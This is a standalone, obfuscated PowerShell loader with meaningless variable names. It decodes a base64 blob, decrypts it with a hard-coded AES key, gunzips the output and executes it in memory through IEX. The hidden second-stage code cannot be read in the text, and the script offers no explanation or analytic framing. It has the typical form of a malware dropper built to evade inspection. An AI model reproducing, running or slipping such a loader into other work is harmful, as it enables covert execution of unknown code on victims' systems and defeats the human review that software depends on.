$efokhoysv = New-Object "System.Security.Cryptography.AesManaged"
$pgcrqzpr = [System.Convert]::FromBase64String("5ZmF03qSj0h7NRqqs7fniZI88tbr0/kAlBiORrImYJtx8HcFw6r2w64OvdfcuKMq3aUH4Bj/njGPgGATsJGsG6yBVNRz8TvcGwUsr9q8pc4xJYoNpmhqhG4s/32ythExEwGReKRm9bLsRvwYyFIuXs1hhIcz1D9ut5ZTfM0Y0RtOTpw88HP2csxM1QL8UZJy94QuJaNM/F9JNFArpJY6VrMpbiKouu1fRAgn5V6uvewayzONaaJhaTyfek1nNFVZ9t9qYO4eUaNlMQeeUnhf12bBrKefV5JD/cwgxG9zGUTzYM2SBsF2AqqNsLdjXrM5574o3LRN3+KRJC8Ei0AtWEDh3vJJxnrPcB0BLWlRYp0vKwPjDxpdnbOnYFB8lybPg2/R+0z40fch2EmPMlhMi/1Wv7ph2bRI/sMLZ+JygeAe9/CT8mbiFXF2h0XWMYLnVNifDD/JAGzc1kVy2E6z1ZUL984K+rxt2iad3VKSopPms8JnW2HELov9NWcaI9pl9djmaVrHX12l/DI/xqnpT+qO8cvORgwwqnkrnjXDpk83hiS9pf088Pk+m5dWVkSSMMq9D4CT8o7ysXwng0OEkjUl8I8z8ldc2+d1UzRjSW1YccuT4OqXjrFTT7dVSovzOW9QExtafLDnaL9Kfadvq5Nxwo6UwprF7KgTtcOzCjhhEP+pTOqy+880QHKPWU5UMmsdmOb/ZLiF1/jhvv55sHfdLYGeq14PEKDZ1BrfVQuZwJFYhXNneSlFQHuBE/Ejs9gz29W7OtDxz4dqx3cd1AyJDL5SUiBxSNQYyyJxk2eD5S6+tnG0oS2iEX1kgGqqhZaH04BYUj0xi/U7tgWtBw==")
$cpqkhi = [System.Convert]::FromBase64String("rQScdykb3N6k7C4XLEOaJNtkOa9q1o9siQ/DzIfAHmQ=")
$efokhoysv.Mode = [System.Security.Cryptography.CipherMode]::ECB
$efokhoysv.BlockSize = 128
$efokhoysv.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
$efokhoysv.IV = $pgcrqzpr[0..15]
$efokhoysv.KeySize = 128
$efokhoysv.Key = $cpqkhi
$sabjvcbc = New-Object System.IO.MemoryStream(,$efokhoysv.CreateDecryptor().TransformFinalBlock($pgcrqzpr,16,$pgcrqzpr.Length-16))
$ouvcffn = New-Object System.IO.MemoryStream
$pxgvwim = New-Object System.IO.Compression.GzipStream $sabjvcbc, ([IO.Compression.CompressionMode]::Decompress)
$pxgvwim.CopyTo($ouvcffn)
$pxgvwim.Close()
$efokhoysv.Dispose()
$sabjvcbc.Close()
$phttft = [System.Text.Encoding]::UTF8.GetString($ouvcffn.ToArray())
IEX($phttft)
